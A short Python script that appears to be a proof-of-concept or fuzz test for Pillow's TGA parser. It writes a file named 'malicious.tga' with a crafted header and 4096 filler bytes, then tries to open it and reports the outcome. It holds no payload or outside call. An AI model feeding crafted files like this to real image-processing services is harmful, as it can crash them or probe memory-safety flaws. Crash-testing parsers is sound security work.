from PIL import Image

with open("malicious.tga", "wb") as f:
    f.write(b"\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
    f.write(b"A" * 0x1000)

try:
    img = Image.open("malicious.tga")
    print("Image opened successfully!")
except Exception as e:
    print("Error opening image:", e)